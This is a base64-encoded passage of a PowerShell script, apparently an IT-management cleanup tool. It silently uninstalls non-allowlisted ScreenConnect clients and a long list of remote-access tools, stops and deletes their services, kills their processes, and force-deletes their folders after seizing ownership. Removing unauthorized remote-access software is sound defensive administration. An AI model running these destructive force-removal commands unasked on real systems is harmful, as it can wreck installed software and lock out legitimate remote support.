ayArIGZvcmNlIGRpciBudWtlLiBLZWVwIG9ubHkgdGhlIHR3byBhbGxvd2xpc3RlZCBmaW5nZXJw
cmludHMuCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdleHRlcm1pbmF0ZS5sb2cnCiAg
ICAka2VlcCA9IEAoJzVmNjAxMDU3OTg1MmU1MDcnLCdmODYxYzgxNDBkNDUzNDI3JywnOTkwODE5
OGU2NjhlNDc1MCcpCiAgICAkbiA9IEB7IHN2YyA9IDA7IHByb2MgPSAwOyBkaXIgPSAwOyBwcm9k
dWN0ID0gMDsgcm1tID0gMDsgZmFpbCA9IDAgfQogICAgZnVuY3Rpb24gTG9nKFtzdHJpbmddJG0p
IHsKICAgICAgICAkbGluZSA9ICd7MH0gezF9JyAtZiAoR2V0LURhdGUgLUZvcm1hdCAneXl5eS1N
TS1kZCBISDptbTpzcycpLCAkbQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9n
IC1WYWx1ZSAkbGluZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIFdyaXRl
LU91dHB1dCAkbGluZQogICAgfQogICAgZnVuY3Rpb24gSXMtS2VlcGVyKFtzdHJpbmddJHMpIHsK
ICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNlIH0KICAgICAgICBmb3JlYWNoICgk
ayBpbiAka2VlcCkgeyBpZiAoJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAkdHJ1ZSB9IH0KICAg
ICAgICByZXR1cm4gJGZhbHNlCiAgICB9CiAgICBmdW5jdGlvbiBGb3JjZS1SZW1vdmVEaXIoW3N0
cmluZ10kZCkgewogICAgICAgIGlmICgtbm90ICRkIC1vciAtbm90IChUZXN0LVBhdGggLUxpdGVy
YWxQYXRoICRkKSkgeyByZXR1cm4gJHRydWUgfQogICAgICAgIEdldC1DaW1JbnN0YW5jZSBXaW4z
Ml9Qcm9jZXNzIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwKICAgICAgICAgICAgV2hl
cmUtT2JqZWN0IHsgJF8uRXhlY3V0YWJsZVBhdGggLWFuZCAkXy5FeGVjdXRhYmxlUGF0aC5TdGFy
dHNXaXRoKCRkLCBbU3RyaW5nQ29tcGFyaXNvbl06Ok9yZGluYWxJZ25vcmVDYXNlKSB9IHwKICAg
ICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBTdG9wLVByb2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAt
Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQogICAgICAgICYgdGFrZW93bi5l
eGUgL0YgJGQgL1IgL0QgWSAyPiYxIHwgT3V0LU51bGwKICAgICAgICAmIGljYWNscy5leGUgJGQg
L2dyYW50ICcqUy0xLTUtMzItNTQ0OkYnIC9UIC9DIC9RIDI+JjEgfCBPdXQtTnVsbAogICAgICAg
ICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJ0FkbWluaXN0cmF0b3JzOkYnIC9UIC9DIC9RIDI+JjEg
fCBPdXQtTnVsbAogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAt
Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICBpZiAoVGVzdC1QYXRo
IC1MaXRlcmFsUGF0aCAkZCkgewogICAgICAgICAgICBjbWQuZXhlIC9jICJhdHRyaWIgLWggLXMg
LXIgL3MgL2QgYCIkZFwqLipgIiIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgIGNtZC5leGUg
L2MgInJtZGlyIC9zIC9xIGAiJGRgIiIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgfQogICAgICAg
IGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7CiAgICAgICAgICAgICRlbXB0eSA9IEpv
aW4tUGF0aCAkZW52OlRFTVAgKCJvd25fZW1wdHlfIiArIFtndWlkXTo6TmV3R3VpZCgpLlRvU3Ry
aW5nKCdOJykpCiAgICAgICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGgg
JGVtcHR5IC1Gb3JjZSB8IE91dC1OdWxsCiAgICAgICAgICAgICYgcm9ib2NvcHkuZXhlICRlbXB0
eSAkZCAvTUlSIC9SOjAgL1c6MCAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgUmVtb3ZlLUl0
ZW0gLUxpdGVyYWxQYXRoICRlbXB0eSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUKICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRkIC1SZWN1cnNlIC1Gb3Jj
ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIH0KICAgICAgICByZXR1cm4g
LW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkKICAgIH0KICAgIGZ1bmN0aW9uIFVuaW5z
dGFsbC1Qcm9kdWN0S2V5KCRrZXkpIHsKICAgICAgICAkZ3VpZCA9ICRrZXkuUFNDaGlsZE5hbWUK
ICAgICAgICAkcHJvcCA9IEdldC1JdGVtUHJvcGVydHkgJGtleS5QU1BhdGggLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUKICAgICAgICAkZG4gPSAkcHJvcC5EaXNwbGF5TmFtZQogICAgICAg
IGlmICgkZ3VpZCAtbGlrZSAneyp9JykgewogICAgICAgICAgICAkcCA9IFN0YXJ0LVByb2Nlc3Mg
bXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL3ggJGd1aWQgL3FuIC9ub3Jlc3RhcnQgUkVCT09U
PVJlYWxseVN1cHByZXNzIiAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgogICAg
ICAgICAgICBMb2cgInByb2R1Y3RfbXNpZXhlYyBbJGRuXSBndWlkPSRndWlkIGV4aXQ9JCgkcC5F
eGl0Q29kZSkiCiAgICAgICAgICAgIGlmICgkcC5FeGl0Q29kZSAtaW4gMCwgMTYwNSwgMTYxNCwg
MzAxMCkgeyByZXR1cm4gJHRydWUgfQogICAgICAgIH0KICAgICAgICAkdXMgPSAkcHJvcC5Vbmlu
c3RhbGxTdHJpbmcKICAgICAgICBpZiAoJHVzKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAg
ICAgICAgICBpZiAoJHVzIC1tYXRjaCAnKD9pKW1zaWV4ZWMnKSB7CiAgICAgICAgICAgICAgICAg
ICAgJGFyZ3MgPSAoJHVzIC1yZXBsYWNlICcoP2kpXi4qbXNpZXhlYyhcLmV4ZSk/XHMqJywgJycp
CiAgICAgICAgICAgICAgICAgICAgaWYgKCRhcmdzIC1ub3RtYXRjaCAnL3FuJykgeyAkYXJncyA9
ICIkYXJncyAvcW4gL25vcmVzdGFydCIgfQogICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQt
UHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICRhcmdzIC1XYWl0IC1QYXNzVGhydSAt
V2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAgICAgICAgICAgTG9nICJwcm9kdWN0X3VuaW5z
dGFsbHN0cmluZ19tc2kgWyRkbl0gZXhpdD0kKCRwLkV4aXRDb2RlKSIKICAgICAgICAgICAgICAg
ICAgICByZXR1cm4gKCRwLkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAxNjE0LCAzMDEwKQogICAgICAg
ICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkcCA9IFN0YXJ0LVByb2Nlc3Mg
Y21kLmV4ZSAtQXJndW1lbnRMaXN0ICIvYyAkdXMgL1MgL3NpbGVudCAvcXVpZXQgL3FuIiAtV2Fp
dCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgICAgICAgICAgICAgICAgIExvZyAi
cHJvZHVjdF91bmluc3RhbGxzdHJpbmdfZXhlIFskZG5dIGV4aXQ9JCgkcC5FeGl0Q29kZSkiCiAg
ICAgICAgICAgICAgICAgICAgcmV0dXJuICgkcC5FeGl0Q29kZSAtZXEgMCkKICAgICAgICAgICAg
ICAgIH0KICAgICAgICAgICAgfSBjYXRjaCB7IExvZyAicHJvZHVjdF91bmluc3RhbGxzdHJpbmdf
RkFJTCBbJGRuXSAkXyIgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9Cgog
ICAgTG9nICdleHRlcm1pbmF0ZV9lbmdpbmVfTDdfYmVnaW4nCgogICAgIyAxLiBmb3JlaWduIFND
IHByb2R1Y3RzIGZyb20gQk9USCBjb3JyZWN0IEFSUCBoaXZlcwogICAgJHNlZW4gPSBAe30KICAg
IGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICBpZiAo
LW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBMb2cgImhpdmVfbWlzc2luZyAkcm9vdCI7IGNvbnRp
bnVlIH0KICAgICAgICBMb2cgImhpdmVfc2NhbiAkcm9vdCIKICAgICAgICBHZXQtQ2hpbGRJdGVt
ICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgewog
ICAgICAgICAgICAkcHJvcCA9IEdldC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlv
biBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICRkbiA9ICRwcm9wLkRpc3BsYXlOYW1lCiAg
ICAgICAgICAgIGlmICgtbm90ICRkbikgeyByZXR1cm4gfQogICAgICAgICAgICBpZiAoJGRuIC1u
b3RtYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RccytDbGllbnRccypcKChbMC05QS1GYS1mXXsxNn0p
XCknKSB7IHJldHVybiB9CiAgICAgICAgICAgICRmcCA9ICRNYXRjaGVzWzFdLlRvTG93ZXIoKQog
ICAgICAgICAgICBpZiAoJGZwIC1pbiAka2VlcCkgeyByZXR1cm4gfQogICAgICAgICAgICBpZiAo
JHNlZW4uQ29udGFpbnNLZXkoJF8uUFNDaGlsZE5hbWUpKSB7IHJldHVybiB9CiAgICAgICAgICAg
ICRzZWVuWyRfLlBTQ2hpbGROYW1lXSA9ICR0cnVlCiAgICAgICAgICAgIGlmIChVbmluc3RhbGwt
UHJvZHVjdEtleSAkXykgeyAkbi5wcm9kdWN0KysgfSBlbHNlIHsgJG4uZmFpbCsrOyBMb2cgInBy
b2R1Y3RfUkVNT1ZFX0ZBSUxFRCBbJGRuXSIgfQogICAgICAgIH0KICAgIH0KCiAgICAjIDIuIGZv
cmVpZ24gU0Mgc2VydmljZXMKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAn
U2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9KSkgewogICAgICAgIGlmIChJcy1LZWVwZXIgJHN2Yy5O
YW1lKSB7IGNvbnRpbnVlIH0KICAgICAgICAmIHNjLmV4ZSBzdG9wICIkKCRzdmMuTmFtZSkiIDI+
JjEgfCBPdXQtTnVsbAogICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNjAwCiAgICAg
ICAgJiBzYy5leGUgZGVsZXRlICIkKCRzdmMuTmFtZSkiIDI+JjEgfCBPdXQtTnVsbAogICAgICAg
ICRuLnN2YysrOyBMb2cgInN2Y19kZWxldGVkICQoJHN2Yy5OYW1lKSIKICAgIH0KCiAgICAjIDMu
IGZvcmVpZ24gU0MgcHJvY2Vzc2VzIChraWxsIGV2ZW4gd2hlbiBFeGVjdXRhYmxlUGF0aCBpcyBu
dWxsKQogICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAiTmFtZSBsaWtl
ICdTY3JlZW5Db25uZWN0JSciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFj
aC1PYmplY3QgewogICAgICAgICRleGUgPSAkXy5FeGVjdXRhYmxlUGF0aAogICAgICAgICRjbWQg
PSAkXy5Db21tYW5kTGluZQogICAgICAgICRrZWVwZXIgPSAoSXMtS2VlcGVyICRleGUpIC1vciAo
SXMtS2VlcGVyICRjbWQpCiAgICAgICAgaWYgKC1ub3QgJGtlZXBlcikgewogICAgICAgICAgICBT
dG9wLVByb2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUKICAgICAgICAgICAgJG4ucHJvYysrOyBMb2cgInByb2Nfa2lsbGVkIHBpZD0kKCRf
LlByb2Nlc3NJZCkgZXhlPSRleGUiCiAgICAgICAgfQogICAgfQoKICAgICMgNC4gZm9yZWlnbiBT
QyBpbnN0YWxsIGRpcnMgKFBGICsgUEY4NikKICAgIGZvcmVhY2ggKCRiYXNlIGluIEAoJGVudjpQ
cm9ncmFtRmlsZXMsICR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSkpIHsKICAgICAgICBpZiAoLW5v
dCAkYmFzZSAtb3IgLW5vdCAoVGVzdC1QYXRoICRiYXNlKSkgeyBjb250aW51ZSB9CiAgICAgICAg
R2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGJhc2UgLURpcmVjdG9yeSAtRm9yY2UgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5O
YW1lIC1saWtlICdTY3JlZW5Db25uZWN0KicgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAg
ICAgICAgICRkID0gJF8uRnVsbE5hbWUKICAgICAgICAgICAgICAgIGlmIChJcy1LZWVwZXIgJGQp
IHsgcmV0dXJuIH0KICAgICAgICAgICAgICAgIGlmIChGb3JjZS1SZW1vdmVEaXIgJGQpIHsgJG4u
ZGlyKys7IExvZyAiZGlyX3JlbW92ZWQgJGQiIH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkbi5m
YWlsKys7IExvZyAiZGlyX1JFTU9WRV9GQUlMRUQgJGQiIH0KICAgICAgICAgICAgfQogICAgfQoK
ICAgICMgNS4gZGlzYWxsb3dlZCBSTU0gLyByZW1vdGUtYWNjZXNzIHRvb2xzIChtYXJrZXQgY292
ZXJhZ2UgMjAyNikuCiAgICAjIEtFRVAgZm9yZXZlcjogRGF0dG8vQ2VudHJhU3RhZ2UgKyBTY3Jl
ZW5Db25uZWN0IGtlZXAgRlBzIChoYW5kbGVkIGFib3ZlKS4KICAgICMgTkVWRVIgcHV0IERhdHRv
L0NlbnRyYVN0YWdlL0NhZ1NlcnZpY2UgaW4gdGhpcyBsaXN0LgogICAgZnVuY3Rpb24gSXMtRGF0
dG9LZWVwZXIoW3N0cmluZ10kcykgewogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFs
c2UgfQogICAgICAgIHJldHVybiBbYm9vbF0oJHMgLW1hdGNoICcoP2kpRGF0dG98Q2VudHJhU3Rh
Z2V8Q2FnU2VydmljZXxBdXRvdGFza0VuZHBvaW50JykKICAgIH0KICAgICRybW0gPSBAKAogICAg
ICAgIEB7IFRhZz0nQW55RGVzayc7ICAgICAgU3ZjPUAoJ0FueURlc2snKTsgUHJvYz1AKCdBbnlE
ZXNrJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQW55RGVzayIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxBbnlEZXNrIiwiJGVudjpQcm9ncmFtRGF0YVxBbnlEZXNrIik7IFByb2Q9QCgn
QW55RGVzayonKSB9CiAgICAgICAgQHsgVGFnPSdUZWFtVmlld2VyJzsgICBTdmM9QCgnVGVhbVZp
ZXdlcionKTsgUHJvYz1AKCdUZWFtVmlld2VyKicsJ3R2X3czMionLCd0dl94NjQqJyk7IERpcnM9
QCgiJGVudjpQcm9ncmFtRmlsZXNcVGVhbVZpZXdlciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
fVxUZWFtVmlld2VyIik7IFByb2Q9QCgnVGVhbVZpZXdlcionKSB9CiAgICAgICAgQHsgVGFnPSdT
cGxhc2h0b3AnOyAgICBTdmM9QCgnU3BsYXNodG9wKicsJ1NSU2VydmljZScsJ1NTVVNlcnZpY2Un
KTsgUHJvYz1AKCdTcGxhc2h0b3AqJywnc3Ryd2luY2x0KicsJ1NSTWFuYWdlcionKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xTcGxhc2h0b3AiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
U3BsYXNodG9wIik7IFByb2Q9QCgnU3BsYXNodG9wKicpIH0KICAgICAgICBAeyBUYWc9J0xvZ01l
SW4nOyAgICAgIFN2Yz1AKCdMb2dNZUluJywnTE1JR3VhcmRpYW5TdmMnLCdMTUlpZ25pdGlvbicp
OyBQcm9jPUAoJ0xvZ01lSW4qJywnTE1JR3VhcmRpYW4qJywnUmFTZXJ2ZXIqJyk7IERpcnM9QCgi
JGVudjpQcm9ncmFtRmlsZXNcTG9nTWVJbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMb2dN
ZUluIik7IFByb2Q9QCgnTG9nTWVJbionKSB9CiAgICAgICAgQHsgVGFnPSdHb1RvJzsgICAgICAg
ICBTdmM9QCgnR29Ub015UEMqJywnR29Ub0Fzc2lzdConLCdHb1RvUmVzb2x2ZSonKTsgUHJvYz1A
KCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ2cybSonLCdHb1RvUmVzb2x2ZSonKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xHb1RvTXlQQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxH
b1RvTXlQQyIpOyBQcm9kPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3QqJywnR29UbyBSZXNvbHZl
KicsJ0dvVG9NZWV0aW5nKicsJ0dvVG8gQ29ubmVjdConKSB9CiAgICAgICAgQHsgVGFnPSdSdXN0
RGVzayc7ICAgICBTdmM9QCgnUnVzdERlc2snLCdydXN0ZGVzayonKTsgUHJvYz1AKCdydXN0ZGVz
ayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSdXN0RGVzayIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxSdXN0RGVzayIpOyBQcm9kPUAoJ1J1c3REZXNrKicpIH0KICAgICAgICBAeyBU
YWc9J1N1cHJlbW8nOyAgICAgIFN2Yz1AKCdTdXByZW1vKicpOyBQcm9jPUAoJ1N1cHJlbW8qJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3VwcmVtbyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxTdXByZW1vIik7IFByb2Q9QCgnU3VwcmVtbyonKSB9CiAgICAgICAgQHsgVGFnPSdEV1Nl
cnZpY2UnOyAgICBTdmM9QCgnRFdBZ2VudCcsJ2R3YWdlbnQqJyk7IFByb2M9QCgnZHdhZ2VudCon
KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xEV0FnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XERXQWdlbnQiLCIkZW52OlByb2dyYW1EYXRhXERXQWdlbnQiKTsgUHJvZD1AKCdEV0Fn
ZW50KicsJ0RXU2VydmljZSonKSB9CiAgICAgICAgQHsgVGFnPSdab2hvQXNzaXN0JzsgICBTdmM9
QCgnWm9ob0Fzc2lzdConLCdab2hvTWVldGluZyonKTsgUHJvYz1AKCdab2hvQXNzaXN0KicsJ1pv
aG9VUlNCKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFpvaG9NZWV0aW5nIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XFpvaG9NZWV0aW5nIik7IFByb2Q9QCgnWm9obyBBc3Npc3QqJywn
Wm9ob01lZXRpbmcqJykgfQogICAgICAgIEB7IFRhZz0nUmVtb3RlUEMnOyAgICAgU3ZjPUAoJ1Jl
bW90ZVBDKicpOyBQcm9jPUAoJ1JlbW90ZVBDKicsJ1JQQ1N1aXRlKicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXFJlbW90ZVBDIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlbW90ZVBD
Iik7IFByb2Q9QCgnUmVtb3RlUEMqJykgfQogICAgICAgIEB7IFRhZz0nQm9tZ2FyJzsgICAgICAg
U3ZjPUAoJ2JvbWdhcionLCdCZXlvbmRUcnVzdConKTsgUHJvYz1AKCdib21nYXIqJyk7IERpcnM9
QCgiJGVudjpQcm9ncmFtRmlsZXNcQm9tZ2FyIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEJv
bWdhciIsIiRlbnY6UHJvZ3JhbUZpbGVzXEJleW9uZFRydXN0IiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XEJleW9uZFRydXN0Iik7IFByb2Q9QCgnQm9tZ2FyKicsJ0JleW9uZFRydXN0KicpIH0K
ICAgICAgICBAeyBUYWc9J1BhcnNlYyc7ICAgICAgIFN2Yz1AKCdQYXJzZWMqJyk7IFByb2M9QCgn
cGFyc2VjZConLCdwc2VydmljZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xQYXJzZWMi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUGFyc2VjIiwiJGVudjpQcm9ncmFtRGF0YVxQYXJz
ZWMiKTsgUHJvZD1AKCdQYXJzZWMqJykgfQogICAgICAgIEB7IFRhZz0nQ2hyb21lUkQnOyAgICAg
U3ZjPUAoJ2Nocm9tb3RpbmcqJyk7IFByb2M9QCgncmVtb3RpbmdfaG9zdConKTsgRGlycz1AKCIk
ZW52OlByb2dyYW1GaWxlc1xHb29nbGVcQ2hyb21lIFJlbW90ZSBEZXNrdG9wIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XEdvb2dsZVxDaHJvbWUgUmVtb3RlIERlc2t0b3AiKTsgUHJvZD1AKCdD
aHJvbWUgUmVtb3RlIERlc2t0b3AqJykgfQogICAgICAgIEB7IFRhZz0nVWx0cmFWTkMnOyAgICAg
U3ZjPUAoJ3V2bmMqJywnd2ludm5jKicpOyBQcm9jPUAoJ3dpbnZuYyonLCd1dm5jKicpOyBEaXJz
PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFVsdHJhVk5DIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XFVsdHJhVk5DIik7IFByb2Q9QCgnVWx0cmFWTkMqJywnV2luVk5DKicpIH0KICAgICAgICBAeyBU
YWc9J1RpZ2h0Vk5DJzsgICAgIFN2Yz1AKCd0dm5zZXJ2ZXIqJyk7IFByb2M9QCgndHZuc2VydmVy
KicsJ3R2bnZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xUaWdodFZOQyIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxUaWdodFZOQyIpOyBQcm9kPUAoJ1RpZ2h0Vk5DKicpIH0K
ICAgICAgICBAeyBUYWc9J1JlYWxWTkMnOyAgICAgIFN2Yz1AKCd2bmNzZXJ2ZXIqJyk7IFByb2M9
QCgndm5jc2VydmVyKicsJ3ZuY3ZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xS
ZWFsVk5DIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlYWxWTkMiKTsgUHJvZD1AKCdWTkMg
U2VydmVyKicsJ1JlYWxWTkMqJykgfQogICAgICAgIEB7IFRhZz0nRGFtZVdhcmUnOyAgICAgU3Zj
PUAoJ0RhbWVXYXJlKicpOyBQcm9jPUAoJ0RXUkNTKicsJ0RXUkNDKicsJ0RhbWVXYXJlKicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNvbGFyV2luZHMiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cU29sYXJXaW5kcyIsIiRlbnY6UHJvZ3JhbUZpbGVzXERhbWVXYXJlIFJlbW90ZSBTdXBw
b3J0IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERhbWVXYXJlIFJlbW90ZSBTdXBwb3J0Iik7
IFByb2Q9QCgnRGFtZVdhcmUqJykgfQogICAgICAgIEB7IFRhZz0nTmV0U3VwcG9ydCc7ICAgU3Zj
PUAoJ05ldFN1cHBvcnQqJyk7IFByb2M9QCgnY2xpZW50MzIqJywncGNpY3RsKicpOyBEaXJzPUAo
IiRlbnY6UHJvZ3JhbUZpbGVzXE5ldFN1cHBvcnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
TmV0U3VwcG9ydCIpOyBQcm9kPUAoJ05ldFN1cHBvcnQqJykgfQogICAgICAgIEB7IFRhZz0nU2lt
cGxlSGVscCc7ICAgU3ZjPUAoJ1NpbXBsZUhlbHAqJyk7IFByb2M9QCgnU2ltcGxlU2VydmljZSon
LCdzaW1wbGVzZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNpbXBsZUhlbHAi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2ltcGxlSGVscCIpOyBQcm9kPUAoJ1NpbXBsZUhl
bHAqJykgfQogICAgICAgIEB7IFRhZz0nR2V0U2NyZWVuJzsgICAgU3ZjPUAoJ0dldFNjcmVlbion
KTsgUHJvYz1AKCdHZXRTY3JlZW4qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcR2V0U2Ny
ZWVuIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdldFNjcmVlbiIpOyBQcm9kPUAoJ0dldFNj
cmVlbionKSB9CiAgICAgICAgQHsgVGFnPSdJcGVyaXVzJzsgICAgICBTdmM9QCgnSXBlcml1cyon
KTsgUHJvYz1AKCdJcGVyaXVzUmVtb3RlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXElw
ZXJpdXMgUmVtb3RlIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XElwZXJpdXMgUmVtb3RlIik7
IFByb2Q9QCgnSXBlcml1cyonKSB9CiAgICAgICAgQHsgVGFnPSdJU0xPbmxpbmUnOyAgIFN2Yz1A
KCdJU0xsaWdodConKTsgUHJvYz1AKCdJU0xsaWdodConLCdJU0xBbHdheXNPbionKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xJU0wgT25saW5lIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XElTTCBPbmxpbmUiKTsgUHJvZD1AKCdJU0wgTGlnaHQqJywnSVNMIEFsd2F5c09uKicpIH0KICAg
ICAgICBAeyBUYWc9J0FtbXl5JzsgICAgICAgIFN2Yz1AKCdBbW15eSonKTsgUHJvYz1AKCdBbW15
eSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBbW15eSIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxBbW15eSIpOyBQcm9kPUAoJ0FtbXl5KicpIH0KICAgICAgICBAeyBUYWc9J1VsdHJh
Vmlld2VyJzsgIFN2Yz1AKCdVbHRyYVZpZXdlcionKTsgUHJvYz1AKCdVbHRyYVZpZXdlcionKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xVbHRyYVZpZXdlciIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxVbHRyYVZpZXdlciIpOyBQcm9kPUAoJ1VsdHJhVmlld2VyKicpIH0KICAgICAgICBA
eyBUYWc9J0Flcm9BZG1pbic7ICAgIFN2Yz1AKCdBZXJvQWRtaW4qJyk7IFByb2M9QCgnQWVyb0Fk
bWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFlcm9BZG1pbiIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxBZXJvQWRtaW4iKTsgUHJvZD1AKCdBZXJvQWRtaW4qJykgfQogICAgICAg
IEB7IFRhZz0nTGl0ZU1hbmFnZXInOyAgU3ZjPUAoJ0xpdGVNYW5hZ2VyKicpOyBQcm9jPUAoJ1JP
TVNlcnZlcionLCdST01WaWV3ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTGl0ZU1h
bmFnZXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGl0ZU1hbmFnZXIiKTsgUHJvZD1AKCdM
aXRlTWFuYWdlcionKSB9CiAgICAgICAgQHsgVGFnPSdSYWRtaW4nOyAgICAgICBTdmM9QCgnUmFk
bWluKicpOyBQcm9jPUAoJ3JzZXJ2ZXIzKicsJ1JhZG1pbionKTsgRGlycz1AKCIkZW52OlByb2dy
YW1GaWxlc1xSYWRtaW4gU2VydmVyIDMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmFkbWlu
IFNlcnZlciAzIik7IFByb2Q9QCgnUmFkbWluKicpIH0KICAgICAgICBAeyBUYWc9J05vTWFjaGlu
